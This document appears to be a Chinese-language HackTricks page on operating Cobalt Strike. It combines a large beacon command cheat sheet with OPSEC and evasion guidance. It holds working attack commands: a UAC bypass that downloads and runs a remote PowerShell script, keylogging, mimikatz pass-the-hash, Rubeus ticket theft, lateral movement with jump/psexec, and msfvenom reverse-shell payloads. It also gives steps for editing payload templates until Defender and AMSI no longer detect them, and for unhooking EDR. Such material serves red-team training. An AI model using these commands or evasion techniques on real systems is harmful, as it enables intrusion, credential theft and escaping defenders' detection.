# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### 监听器

### C2 监听器

`Cobalt Strike -> Listeners -> Add/Edit`，然后你可以选择监听位置、要使用的 beacon 类型（http、dns、smb...）等。

### Peer2Peer 监听器

这些监听器的 beacon 不需要直接与 C2 通信，可以通过其他 beacon 与其通信。

`Cobalt Strike -> Listeners -> Add/Edit`，然后选择 TCP 或 SMB beacon

* **TCP beacon 会在所选端口上设置监听器**。若要连接 TCP beacon，请在另一个 beacon 中使用命令 `connect <ip> <port>`
* **SMB beacon 会使用所选名称在管道名称上监听**。若要连接 SMB beacon，需要使用命令 `link [target] [pipe]`。

### 生成并托管 payload

#### 将 payload 生成为文件

`Attacks -> Packages ->`

* **`HTMLApplication`** 用于 HTA 文件
* **`MS Office Macro`** 用于带有宏的 Office 文档
* **`Windows Executable`** 用于 .exe、.dll 或服务 .exe
* **`Windows Executable (S)`** 用于 **stageless** .exe、.dll 或服务 .exe（stageless 优于 staged，IoC 更少）

#### 生成并托管 payload

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 会生成一个脚本/可执行文件，从 Cobalt Strike 下载 beacon，格式包括：bitsadmin、exe、powershell 和 python

#### 托管 payload

如果你已经有要在 Web 服务器上托管的文件，只需前往 `Attacks -> Web Drive-by -> Host File`，然后选择要托管的文件和 Web 服务器配置。

### Beacon 选项

<details>
<summary>Beacon 选项和命令</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### 自定义 implant / Linux Beacons

- 自定义 agent 只需使用 Cobalt Strike Team Server HTTP/S 协议（默认的 malleable C2 profile）进行注册/签到并接收任务。实现 profile 中定义的相同 URI、headers 和 metadata 加密，即可复用 Cobalt Strike UI 来下发任务和查看输出。<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script（例如 `CustomBeacon.cna`）可以封装非 Windows beacon 的 payload 生成流程，让操作人员能够选择 listener 并直接从 GUI 生成 ELF payload。
- 向 Team Server 暴露的 Linux 任务处理程序示例：`sleep`、`cd`、`pwd`、`shell`（执行任意命令）、`ls`、`upload`、`download` 和 `exit`。这些命令对应 Team Server 预期的任务 ID，必须在服务器端实现，并按正确格式返回输出。
- Linux 上的 BOF 支持可以通过在进程内加载 Beacon Object Files 实现，使用 [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader)（也支持 Outflank 风格的 BOF），从而在 implant 的上下文/权限中运行模块化 post-exploitation，而无需创建新进程。<sup>[[2]](#references)[[3]](#references)</sup>
  有关 Linux loader 格式和进程边界的注意事项，以及单独的 BOF 任务示例，请参见 [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries)。
- 在自定义 beacon 中嵌入 SOCKS handler，以保持与 Windows Beacons 相同的 pivoting 能力：操作人员运行 `socks <port>` 时，implant 应启动本地代理，将操作人员的工具流量经由已攻陷的 Linux 主机转发到内部网络。

## OPSEC

### Execute-Assembly

**`execute-assembly`** 使用 **sacrificial process**，通过远程进程注入执行指定程序。由于向进程注入时会使用一些每个 EDR 都会监控的 Win API，因此这种方式非常显眼。不过，也有一些自定义工具可以在同一进程中加载内容：

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- 在 Cobalt Strike 中也可以使用 BOF（Beacon Object Files）：[https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor Script `https://github.com/outflanknl/HelpColor` 会在 Cobalt Strike 中创建 `helpx` 命令，为命令添加颜色，标示它们是否为 BOF（绿色）、Frok&Run（黄色）或 ProcessExecution、injection 等（红色）。这有助于判断哪些命令更隐蔽。

### 现代进程内 post-execution

在经典 COFF BOF 功能受限时，近期版本新增了两种替代方案：

- **Beacon Interpreter** 在 Team Server 上将 C 编译为中间字节码，并在嵌入 Beacon 的 VM 中执行。字节码仍是数据，而不是原生可执行代码，因此无需加载 BOF 时通常需要的额外可执行内存分配以及 RW 到 RX 的权限转换。脚本可以导入 Beacon API，并声明 BOF 风格的 Dynamic Function Resolution (DFR) 原型。
- **BOF-PE** 在当前 Beacon 中加载完整的 EXE 或 DLL。此格式支持常规 PE imports、异常处理、功能更丰富的 C++ 和外部库，同时保留 Beacon API。它比小型 COFF BOF 更重，因此仅在确实需要额外运行时环境时使用。

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

这些机制可以减少与 loader 相关的信号，但无法减少脚本操作或 Windows API 调用产生的遥测数据。<sup>[[8]](#references)</sup>

### 模拟用户身份

可以检查 `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` 等事件：

- Security EID 4624 - 检查所有交互式登录，了解常规工作时段。
- System EID 12,13 - 检查关机、启动和睡眠的频率。
- Security EID 4624/4625 - 检查传入的有效或无效 NTLM 尝试。
- Security EID 4648 - 使用明文凭据登录时会生成此事件。如果某个进程触发了该事件，该二进制文件可能在配置文件或代码中以明文保存了凭据。

在 Cobalt Strike 中使用 `jump` 时，最好使用 `wmi_msbuild` 方法，让新进程看起来更合法。

### 使用计算机账户

防御人员通常会检查用户产生的异常行为，**并将服务账户和计算机账户（如 `*$`）排除在监控范围之外**。你可以使用这些账户进行横向移动或权限提升。

### 使用 Stageless payloads

Stageless payloads 比 staged payloads 更隐蔽，因为它们不需要从 C2 服务器下载第二阶段。这意味着初始连接后不会产生网络流量，因此不容易被基于网络的防御机制检测到。

### Tokens & Token Store

窃取或生成 tokens 时要小心，因为 EDR 可能会枚举线程 tokens，并检测到进程中存在**属于其他用户的 token**，甚至是 SYSTEM 的 token。

这项功能允许**为每个 beacon 存储 tokens**，因此无需反复窃取同一个 token。这在横向移动或需要多次使用窃取到的 token 时很有用：

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

进行横向移动时，通常**窃取 token 比生成新 token**或执行 pass the hash 攻击更好。

### Guardrails

Cobalt Strike 有一项名为 **Guardrails** 的功能，可以帮助阻止使用某些可能被防御人员检测到的命令或操作。Guardrails 可以配置为阻止特定命令，例如 `make_token`、`jump`、`remote-exec` 以及其他常用于横向移动或权限提升的命令。

此外，仓库 [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) 也包含一些检查项和思路，可供你在执行 payload 前参考。

### Tickets 加密

在 AD 环境中，要注意 tickets 的加密方式。某些工具默认会对 Kerberos tickets 使用 RC4 加密，其安全性低于 AES；而更新的环境通常默认使用 AES。监控弱加密算法的防御人员可以检测到这种情况。

### 避免使用默认值

使用 Cobalt Strike 时，默认的 SMB pipes 名称为 `msagent_####` 和 `"status_####`。请修改这些名称。你可以在 Cobalt Strike 中使用命令 `ls \\.\pipe\` 查看现有 pipes 的名称。

此外，SSH sessions 会创建名为 `\\.\pipe\postex_ssh_####` 的 pipe。使用 `set ssh_pipename "<new_name>";` 修改它。

在 post-ex exploitation 攻击中，pipes `\\.\pipe\postex_####` 也可以通过 `set pipename "<new_name>"` 修改。

在 Cobalt Strike profiles 中，你还可以修改以下内容：

- 避免使用 `rwx`
- 在 `process-inject {...}` 块中设置进程注入行为（将使用哪些 APIs）
- 在 `post-ex {…}` 块中设置 "fork and run" 的工作方式
- sleep 时间
- 加载到内存中的二进制文件最大大小
- 使用 `stage {...}` 块配置内存占用和 DLL 内容
- 网络流量

### Sleepmask 和 BeaconGate

Sleepmask 会在 Beacon 休眠时转换 Beacon 及其跟踪的堆分配，然后在执行任务时将其还原。当前版本提供了规避检测的默认实现，但当内存布局、分配或调用栈要求不同时，自定义 Sleepmask BOFs 仍然有用。从 4.13 版本开始，默认 Sleepmask 还会为通过 BeaconGate 代理的 APIs 伪造返回地址。<sup>[[8]](#references)</sup>

**BeaconGate** 将此设计扩展到 `Sleep` 之外：选定的 WinAPI 调用会被表示为 `FUNCTION_CALL` 结构，并转发给 Sleepmask BOF，由它在执行调用时隐藏 Beacon。Profile 可以对一组 APIs（`Comms`、`Core`、`Cleanup` 或 `All`）启用 gate，也可以只针对单个 API 启用：<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

对于列在 `beacon_gate` 下的 API，gate 的优先级高于 `syscall_method`；未列出的 API 仍可使用配置的 syscall 方法。`beacon_gate disable` 和 `beacon_gate enable` 可在运行时切换此功能。不要盲目启用 `All`：例如 `ps` 等命令会反复调用 `OpenProcess`/`CloseHandle`，如果每次调用都对 Beacon 进行屏蔽和解除屏蔽，可能导致 CPU 使用率飙升。Sleepmask-VS 提供模拟的 Beacon/Sleepmask 状态，便于调试自定义 gate，而无需通过运行中的 implant 反复测试。<sup>[[9]](#references)</sup>

### 嘈杂的进程注入

向进程注入代码通常会产生很多噪声，因为**常规进程通常不会执行此类操作，而且实现方式非常有限**。因此，基于行为的检测系统可能会发现这种行为。此外，EDR 也可能扫描内存，检测**包含磁盘上不存在的代码的线程**（不过，浏览器等使用 JIT 的进程中经常会出现这种情况）。示例：[https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID 和 PPID 关系

生成新进程时，**保持进程间正常的父子关系**很重要，这样可以避免被检测到。如果 svchost.exec 正在执行 iexplorer.exe，就会显得可疑，因为在正常的 Windows 环境中，svchost.exe 并不是 iexplorer.exe 的父进程。

在 Cobalt Strike 中生成新的 beacon 时，默认会创建一个使用 **`rundll32.exe`** 的进程来运行新的 listener。这种方式不够隐蔽，很容易被 EDR 检测到。此外，`rundll32.exe` 运行时不带任何参数，这会让它显得更加可疑。

使用以下 Cobalt Strike 命令，可以指定另一个进程来生成新的 beacon，从而降低被检测到的可能性：

```bash
spawnto x86 svchost.exe
```

你也可以在 profile 中更改此设置 **`spawnto_x86` and `spawnto_x64`**。

### 代理攻击者的流量

攻击者有时需要能够在本地运行工具（即使是在 Linux 机器上），并让受害者的流量到达该工具（例如 NTLM relay）。

此外，有时进行 pass-the.hash 或 pass-the-ticket 攻击时，攻击者将此 hash 或 ticket **添加到自己本地的 LSASS 进程中**，然后从该进程 pivot，会比修改受害者机器的 LSASS 进程更隐蔽。

不过，你需要**小心生成的流量**，因为你可能会从 backdoor 进程发送不常见的流量（例如 Kerberos？）。为此，你可以 pivot 到浏览器进程（不过，向进程注入自身可能会被发现，因此要考虑如何隐蔽地执行）。

### 规避 AV

#### AV/AMSI/ETW Bypass

查看此页面：

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

通常可以在 `/opt/cobaltstrike/artifact-kit` 中找到代码和预编译模板（位于 `/src-common`），这些模板用于生成 Cobalt Strike 将使用的 payload binary beacon。

使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 检查生成的 backdoor（或直接检查编译后的模板），即可找到触发 Defender 的内容。通常这是一个字符串。因此，你只需修改生成 backdoor 的代码，使该字符串不会出现在最终的二进制文件中。

修改代码后，在同一目录中运行 `./build.sh`，然后将 `dist-pipe/` 文件夹复制到 Windows 客户端的 `C:\Tools\cobaltstrike\ArtifactKit`。

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

别忘了加载 aggressive script `dist-pipe\artifact.cna`，以指示 Cobalt Strike 使用我们指定的磁盘资源，而不是已加载的资源。

#### Resource Kit

ResourceKit 文件夹包含 Cobalt Strike 基于脚本的 payload 模板，包括 PowerShell、VBA 和 HTA。

使用这些模板配合 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)，可以找出 Defender（此处指 AMSI）不喜欢的内容，并对其进行修改：

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

修改检测到的行，就可以生成一个不会被检测到的模板。

别忘了加载 aggressive 脚本 `ResourceKit\resources.cna`，以指示 Cobalt Strike 使用我们指定的磁盘资源，而不是已加载的资源。

#### 函数钩子 | Syscall

函数钩子是 EDR 检测恶意活动的常见方法。Cobalt Strike 允许你使用 **`None`** 配置，通过 **syscalls** 而非标准 Windows API 调用来绕过这些钩子；也可以使用函数的 `Nt*` 版本并设置 **`Direct`**，或者在 malleable profile 中使用 **`Indirect`** 选项，直接跳过 `Nt*` 函数。根据系统情况，某种选项可能比其他选项更隐蔽。

可以在 profile 中设置此项，也可以使用 **`syscall-method`** 命令。

不过，这也可能产生较多噪声。

Cobalt Strike 提供的一种绕过函数钩子的方法是移除这些钩子：[**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof)。

你也可以使用 [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 或 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) 检查哪些函数被挂钩。




<details>
<summary>杂项 Cobalt Strike 命令</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon（自定义 implant PoC）](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader 和 Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF 模板](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42 对 Cobalt Strike 元数据加密的分析](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC 关于 Cobalt Strike 流量的日志](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13：迷失在翻译中](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10：穿越 BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
